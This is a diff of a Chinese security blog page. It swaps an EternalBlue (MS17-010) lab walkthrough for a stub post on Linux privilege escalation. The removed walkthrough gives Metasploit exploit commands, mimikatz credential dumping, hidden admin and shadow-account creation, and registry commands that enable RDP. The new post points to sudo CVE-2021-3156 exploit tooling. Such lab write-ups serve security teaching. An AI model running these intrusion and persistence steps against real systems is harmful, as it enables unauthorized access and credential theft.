@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="漏洞复现之永恒之蓝(ms17-010), z1r0s 安全 渗透 编程">
+    <meta name="keywords" content="Linux提权姿势总结, z1r0s 安全 渗透 编程">
     <meta name="description" content="z1r0s | 程序语言 | 网络安全 | 红蓝对抗">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>漏洞复现之永恒之蓝(ms17-010) | z1r0s</title>
+    <title>Linux提权姿势总结 | z1r0s</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -341,7 +341,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '1b2a4a505f8ab209e2a37808e17f9514eb9ef5345874e2cef007badf616edea5';
+        let pwd = '';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -354,12 +354,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/94.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/181.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">漏洞复现之永恒之蓝(ms17-010)</h1>
+                    <h1 class="description center-align post-title">Linux提权姿势总结</h1>
                 </div>
             </div>
         </div>
@@ -475,8 +475,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Windows/">
-                                <span class="chip bg-color">Windows</span>
+                            <a href="/tags/Linux/">
+                                <span class="chip bg-color">Linux</span>
+                            </a>
+                        
+                            <a href="/tags/姿势/">
+                                <span class="chip bg-color">姿势</span>
                             </a>
                         
                     </div>
@@ -487,8 +491,12 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/漏洞利用/" class="post-category">
-                                漏洞利用
+                            <a href="/categories/Security/" class="post-category">
+                                Security
+                            </a>
+                        
+                            <a href="/categories/Security/Post/" class="post-category">
+                                Post
                             </a>
                         
                     </div>
@@ -500,28 +508,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-24
+                    2021-03-31
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-12-22
+                    2021-04-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    412
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    1 分
                 </div>
                 
 
@@ -546,149 +554,21 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>​        Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
-<p>​        2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。</p>
-<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>​        目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
-<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul>
-<li>攻击机：Kali 2020.08（IP：10.10.10.152）</li>
-<li>靶机：Windows 7 X64 （IP：10.10.10.129）</li>
-</ul>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/实验拓扑.png" alt="实验拓扑"></center>
+                <h1 id="0x00-提权"><a href="#0x00-提权" class="headerlink" title="0x00 提权"></a>0x00 提权</h1><p>Linux提权可能需要反弹 bash ，因为脚本语言无法形成管道，需要创造一个管道才能进行后续的操作，比如溢出成功之后返回一个 root 权限的 shell，脚本语言执行完就完了，不会返回一个可以操作的 <code>root shell</code>。</p>
+<h2 id="Linux-提权助手"><a href="#Linux-提权助手" class="headerlink" title="Linux 提权助手"></a>Linux 提权助手</h2><p><a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener"> <code>Linux-Exploit-Suggester</code></a>是一款根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行<code>uname -r</code>返回的操作系统发行版本，或者手工输入<code>-k</code>参数查找指定版本号。 </p>
+<p><strong>安装</strong>：</p>
+<pre class=" language-shell"><code class="language-shell">git clone git@github.com:mzet-/linux-exploit-suggester.git</code></pre>
+<p><strong>使用</strong>：</p>
+<pre class=" language-shell"><code class="language-shell">./linux-exploit-suggester.sh</code></pre>
+<p><strong>结果</strong>：</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Linux-Privilege-Escalation-Summary/Linux-Exploit-Suggester检测Linux内核版本信息.png" alt="Linux-Exploit-Suggester检测Linux内核版本信息"></center>
+
+<p>使用<code>CVE-2021-3156-Exp</code>进行提权操作。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Linux-Privilege-Escalation-Summary/exp拿到root权限.png" alt="exp拿到root权限"></center>
 
 
 
-<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="0x01主机发现"><a href="#0x01主机发现" class="headerlink" title="0x01主机发现"></a>0x01主机发现</h2><ol>
-<li><p>在nmap中使用如下命令来探测本网段存活主机，操作结果如下图所示。</p>
-<pre class=" language-shell"><code class="language-shell">nmap -r 10.10.10.0/24</code></pre>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/nmap主机存活判断.png" alt="nmap主机存活判断"></center>
-
-<p>探测到ip为<code>10.10.10.129</code>的主机存活，并探测到开放<code>445</code>端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p>
-</li>
-</ol>
-<h2 id="0x02-进入MSF框架"><a href="#0x02-进入MSF框架" class="headerlink" title="0x02 进入MSF框架"></a>0x02 进入MSF框架</h2><ol>
-<li><p>输入<code>msfconsole</code>命令进入MSF框架，显示结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/msfconsole.png" alt="msfconsole"></center>
-</li>
-<li><p>输入<code>search ms17-010</code>命令，查看MSF框中与ms17-010相关的渗透模块，显示结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/与ms17-010相关模块.png" alt="与ms17-010相关模块"></center>
-
-<ul>
-<li><code>auxiliary/scanner/smb/smb_ms17_010</code>是扫描MS17-010永恒之蓝的模块，扫描或者说检查目标主机是否存在MS17-010永恒之蓝的漏洞；</li>
-<li><code>exploit/windows/smb/ms17_010_eternalblue</code>是永恒之蓝攻击代码的模块，就是所说的漏洞利用模块。</li>
-</ul>
-</li>
-</ol>
-<h2 id="0x03-ms17-010扫描模块"><a href="#0x03-ms17-010扫描模块" class="headerlink" title="0x03 ms17-010扫描模块"></a>0x03 ms17-010扫描模块</h2><ol>
-<li><p>输入如下命令，使用永恒之蓝的扫描模块，操作结果如下图所示。</p>
-<pre class=" language-shell"><code class="language-shell">use auxiliary/scanner/smb/smb_ms17_010</code></pre>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/使用永恒之蓝扫描模块.png" alt="使用永恒之蓝扫描模块"></center>
-</li>
-<li><p>设置目标主机的IP（RHOST），输入如下命令，操作结果如下图所示。</p>
-<pre class=" language-shell"><code class="language-shell">set rhosts 10.10.10.129</code></pre>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/设置RHOSTS值.png" alt="设置RHOSTS值"></center>
-</li>
-<li><p>使用扫描探测，显示结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/永恒之蓝扫描结果.png" alt="永恒之蓝扫描结果"></center>
-
-<p>扫描结果显示目标主机可能存在永恒之蓝漏洞，下面使用攻击模块机型见攻击测试。</p>
-</li>
-</ol>
-<h2 id="0x04-ms17-010攻击模块"><a href="#0x04-ms17-010攻击模块" class="headerlink" title="0x04 ms17-010攻击模块"></a>0x04 ms17-010攻击模块</h2><ol>
-<li><p>使用如下命令进入永恒之蓝的攻击模块，操作结果如下图所示。</p>
-<pre class=" language-shell"><code class="language-shell">use exploit/windows/smb/ms17_010_eternalblue</code></pre>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/进入永恒之蓝攻击模块.png" alt="进入永恒之蓝攻击模块"></center>
-</li>
-<li><p>使用<code>options</code>命令查看必须要手动配置的参数，显示结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/查看攻击模块需要配置的参数.png" alt="查看攻击模块需要配置的参数"></center>
-</li>
-<li><p>使用<code>set rhosts 10.10.10.129</code>命令来设置远程主机的IP地址，操作结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/攻击模块设置远程主机IP.png" alt="攻击模块设置远程主机IP"></center>
-</li>
-<li><p>永恒之蓝攻击模块默认，缺省使用的Payload为<code>windows/x64/meterpreter/reverse_tcp</code>，如果想使用其他Payload需要重新设置，这里使用默认的Payload。</p>
-</li>
-<li><p>输入<code>exploit</code>命令后MSF开始攻击渗透，攻击成功后得到一个<code>meterpreter</code>会话，显示结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/永恒之蓝拿到shell.png" alt="永恒之蓝建立meterpreter会话"></center>
-</li>
-<li><p>输入<code>shell</code>拿到目标主机shell控制权，操作结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/拿到目标数据shell权限.png" alt="拿到目标数据shell权限"></center>
-
-<p>此时我们已经拿到了目标主机（WIN7）的shell控制权限，之后可以通过Shell对目标靶机进行控制。接下来就是进入了后渗透阶段。</p>
-</li>
-<li><p>用msf中的<code>mimikatz</code>，爆出目标主机的用户名和密码，<code>Wdigest</code>读取内存存放的账号密码，操作结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/通过读取内存爆用户密码.png" alt="通过读取内存爆用户密码"></center>
-
-</li>
-</ol>
-<h2 id="0x05-后渗透阶段"><a href="#0x05-后渗透阶段" class="headerlink" title="0x05 后渗透阶段"></a>0x05 后渗透阶段</h2><ol>
-<li><p>首先使用如下命令创建一个用户并将其提权为管理员，操作结果如下图所示。</p>
-<pre class=" language-shell"><code class="language-shell">net user admin$ 123.com /add
-net localgroup administrators admin$ /add</code></pre>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/创建权限维持用户.png" alt="创建权限维持用户"></center>
-</li>
-<li><p>提权以后我们需要打开目标主机的3389远程桌面端口，以便使用3389端口控制对方系统，输入如下命令，操作结果如下图所示。</p>
-<pre class=" language-shell"><code class="language-shell">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/强制打开3389端口.png" alt="强制打开3389端口"></center>
-
-<p>使用nmap探测远程主机端口，显示结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/远程主机端口扫描2.png" alt="远程主机端口扫描"></center>
-</li>
-<li><p>打开远程桌面后就需要登录测试一下，但是再测试之前最好先使用<code>screenshot</code>命令获取截屏，操作结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/远程桌面截屏.png" alt="远程桌面截屏"></center>
-</li>
-<li><p>使用如下命令连接目标主机的远程桌面，操作结果如下图所示。</p>
-<pre class=" language-shell"><code class="language-shell">rdesktop 10.10.10.129</code></pre>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/登录远程桌面.png" alt="登录远程桌面"></center>
-
-<p><font color="red">在Windows 7中登录远程桌面时，若已经有用户登录，则会显示夺权信息，若无操作30s后会成功访问。</font></p>
-</li>
-<li><p>远程登录操作结果显示如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/远程登录成功.png" alt="远程登录成功"></center>
-
-
-
-</li>
-</ol>
-<h2 id="0x06-影子账户"><a href="#0x06-影子账户" class="headerlink" title="0x06 影子账户"></a>0x06 影子账户</h2><ol>
-<li><p>创建一个名为<code>ss$</code>的用户，操作结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/创建新用户作为影子账户.png" alt="创建新用户作为影子账户"></center>
-</li>
-<li><p>使用<code>regedit</code>打开注册表<code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/</code>，显示结果如下图所示。<font color="blue">若打不开则需要设置权限，默认情况下SAM文件夹只有SYSTEM具有完全控制权限。</font></p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/打开注册表.png" alt="打开注册表"></center>
-</li>
-<li><p>在Names文件夹中点击【<code>ss$</code>】，在右侧显示16进制数值如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/查看ss$用户.png" alt="查看ss$用户"></center>
-</li>
-<li><p>找到Administrator的十六进制数字，然后找到对应的00000（十六进制）文件夹打开，复制Administrator的<strong>000001F4</strong>文件夹里面的<strong>F值</strong>到我们的隐藏账户<code>ss$</code>里面的<strong>F值</strong>中，操作结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/影子账户修改F值.gif" alt="影子账户修改F值"></center>
-</li>
-<li><p>找到Names里面的<code>ss$</code>和<code>ss$</code>对应的十六进制目录，右键导出到桌面，操作结果如下如所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/注册表导出.png" alt="注册表导出"></center>
-</li>
-<li><p>使用<code>net user ss$ /del</code>命令删除<code>ss$</code>用户，操作结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/删除ss$用户.png" alt="删除ss$用户"></center>
-</li>
-<li><p>将刚刚导出的注册表信息重新导入，操作结果如下图所示。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/注册表导入.png" alt="注册表导入"></center>
-</li>
-<li><p>使用影子账户<code>ss$</code>登录，其实是以Administrator的身份登录，影子账户所做操作，Administrator都可以看见。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/影子账户登录.png" alt="影子账户登录"></center>
-
-
-
-</li>
-</ol>
-<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul>
-<li><p>升级微软补丁MS17-010</p>
-</li>
-<li><p>Windows7、Windows8、Windows10电脑启用Windows防火墙添加策略关闭135、137、138、139、445端口</p>
-</li>
-<li><p>(若有杀软)升级杀毒软件最新版本</p>
-</li>
-</ul>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
-<li><a href="https://mp.weixin.qq.com/s/xUEmnaFNP44iLzdw3WDrDg" target="_blank" rel="noopener">【漏洞复现】MS17-010永恒之蓝</a></li>
-<li><a href="https://www.cnblogs.com/-1au/p/10176389.html" target="_blank" rel="noopener">影子账户</a></li>
-</ul>
+<h1 id="0x01-利用内核栈溢出提权"><a href="#0x01-利用内核栈溢出提权" class="headerlink" title="0x01 利用内核栈溢出提权"></a>0x01 利用内核栈溢出提权</h1><h1 id="0x02-明文root密码提权"><a href="#0x02-明文root密码提权" class="headerlink" title="0x02 明文root密码提权"></a>0x02 明文root密码提权</h1><h1 id="0x03-密码复用"><a href="#0x03-密码复用" class="headerlink" title="0x03 密码复用"></a>0x03 密码复用</h1><h1 id="0x04-sudo滥用"><a href="#0x04-sudo滥用" class="headerlink" title="0x04 sudo滥用"></a>0x04 sudo滥用</h1><h1 id="0x05-su-root被禁止解决"><a href="#0x05-su-root被禁止解决" class="headerlink" title="0x05 su root被禁止解决"></a>0x05 su root被禁止解决</h1><h1 id="0x06-计划任务"><a href="#0x06-计划任务" class="headerlink" title="0x06 计划任务"></a>0x06 计划任务</h1><h1 id="0x07-SUID"><a href="#0x07-SUID" class="headerlink" title="0x07 SUID"></a>0x07 SUID</h1><h1 id="0x08-环境变量劫持-SUID扩展"><a href="#0x08-环境变量劫持-SUID扩展" class="headerlink" title="0x08 环境变量劫持-SUID扩展"></a>0x08 环境变量劫持-SUID扩展</h1><h1 id="0x09-管理员配置错误"><a href="#0x09-管理员配置错误" class="headerlink" title="0x09 管理员配置错误"></a>0x09 管理员配置错误</h1><h1 id="0x10-Docker组提权"><a href="#0x10-Docker组提权" class="headerlink" title="0x10 Docker组提权"></a>0x10 Docker组提权</h1><h1 id="0x11-服务漏洞"><a href="#0x11-服务漏洞" class="headerlink" title="0x11 服务漏洞"></a>0x11 服务漏洞</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/weixin_43781139/article/details/114370859" target="_blank" rel="noopener">CVE-2021-3156复现_孤客浪子的博客-CSDN博客</a><br><a href="https://s.tencent.com/research/bsafe/1238.html" target="_blank" rel="noopener">【通告更新：EXP已公开】Sudo堆溢出漏洞（CVE-2021-3156）风险通告，腾讯主机安全（云镜）已支持检测 - 威胁研究首页_威胁检测平台_联合实验室_研究报告_威胁通告_荣誉认证 - 腾讯安全</a><br><a href="https://cert.360.cn/warning/detail?id=1b03966ea9249d9bbec710b30f4374b0" target="_blank" rel="noopener">【更新:EXP公开】CVE-2021-3156：Sudo 堆缓冲区溢出漏洞通告 - 360CERT</a><br><a href="https://github.com/blasty/CVE-2021-3156" target="_blank" rel="noopener">blasty/CVE-2021-3156</a><br><a href="https://www.anquanke.com/post/id/231408" target="_blank" rel="noopener">CVE-2021-3156 sudo heap-based bufoverflow 复现&amp;分析 - 安全客，安全资讯平台</a><br><a href="https://blog.sec-it.fr/en/2021/02/08/sudo-vulns/#CVE-2021-3156" target="_blank" rel="noopener">Some sudo elevation of privilege vulnerabilities | SEC-IT Blog</a><br><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">Linux 提权的各种姿势总结 - 云+社区 - 腾讯云</a></p>
 
                 
             </div>
@@ -715,7 +595,7 @@ net localgroup administrators admin$ /add</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.z1r0s.top/2020/11/24/security/vulnexp/lou-dong-fu-xian-zhi-yong-heng-zhi-lan-ms17-010/">https://www.z1r0s.top/2020/11/24/security/vulnexp/lou-dong-fu-xian-zhi-yong-heng-zhi-lan-ms17-010/</a>
+                    <a href="https://www.z1r0s.top/2021/03/31/security/post/linux-ti-quan-zi-shi-zong-jie/">https://www.z1r0s.top/2021/03/31/security/post/linux-ti-quan-zi-shi-zong-jie/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -753,8 +633,12 @@ net localgroup administrators admin$ /add</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Windows/">
-                                    <span class="chip bg-color">Windows</span>
+                                <a href="/tags/Linux/">
+                                    <span class="chip bg-color">Linux</span>
+                                </a>
+                            
+                                <a href="/tags/姿势/">
+                                    <span class="chip bg-color">姿势</span>
                                 </a>
                             
                         </div>
@@ -953,16 +837,18 @@ net localgroup administrators admin$ /add</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/11/25/network/configuration/wang-luo-pei-zhi-zhi-stp-hsrp-shi-yan/">
+                <a href="/2021/03/31/security/post/linux-ti-quan-zi-shi-zong-jie/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/111.jpg" class="responsive-img" alt="网络配置之STP+HSRP实验">
                         
-                        <span class="card-title">网络配置之STP+HSRP实验</span>
+                        <img src="/medias/featureimages/181.jpg" class="responsive-img" alt="Linux提权姿势总结">
+                        
+                        <span class="card-title">Linux提权姿势总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -972,26 +858,35 @@ net localgroup administrators admin$ /add</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-25
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-31
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/网络配置/" class="post-category">
-                                    网络配置
+                            <a href="/categories/Security/" class="post-category">
+                                    Security
+                                </a>
+                            
+                            <a href="/categories/Security/Post/" class="post-category">
+                                    Post
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/网络实验/">
-                        <span class="chip bg-color">网络实验</span>
+                    <a href="/tags/Linux/">
+                        <span class="chip bg-color">Linux</span>
+                    </a>
+                    
+                    <a href="/tags/姿势/">
+                        <span class="chip bg-color">姿势</span>
                     </a>
                     
                 </div>
@@ -1005,12 +900,13 @@ net localgroup administrators admin$ /add</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/11/24/network/configuration/wang-luo-pei-zhi-zhi-hsrp-shi-yan/">
+                <a href="/2021/03/16/security/webvuln/unserialize/php-fan-xu-lie-hua/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/148.jpg" class="responsive-img" alt="网络配置之HSRP实验">
                         
-                        <span class="card-title">网络配置之HSRP实验</span>
+                        <img src="/medias/featureimages/131.jpg" class="responsive-img" alt="PHP反序列化">
+                        
+                        <span class="card-title">PHP反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1021,14 +917,22 @@ net localgroup administrators admin$ /add</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/网络配置/" class="post-category">
-                                    网络配置
+                            <a href="/categories/Security/" class="post-category">
+                                    Security
+                                </a>
+                            
+                            <a href="/categories/Security/Web/" class="post-category">
+                                    Web
+                                </a>
+                            
+                            <a href="/categories/Security/Web/反序列化/" class="post-category">
+                                    反序列化
                                 </a>
                             
                             
@@ -1038,8 +942,12 @@ net localgroup administrators admin$ /add</code></pre>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/网络实验/">
-                        <span class="chip bg-color">网络实验</span>
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                    <a href="/tags/反序列化/">
+                        <span class="chip bg-color">反序列化</span>
                     </a>
                     
                 </div>
@@ -1249,7 +1157,7 @@ net localgroup administrators admin$ /add</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">306.2k</span>&nbsp;字
+                class="white-color">306.7k</span>&nbsp;字
             
             
             
@@ -1467,10 +1375,10 @@ $(function () {
     
 
     
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
     
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"left","width":200,"height":410},"mobile":{"show":false},"react":{"opacity":0.7}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"left","width":200,"height":410},"mobile":{"show":false},"react":{"opacity":0.7}});</script></body>
 
 </html>
 <script type="text/javascript" src="/js/click_show_text.js"></script>
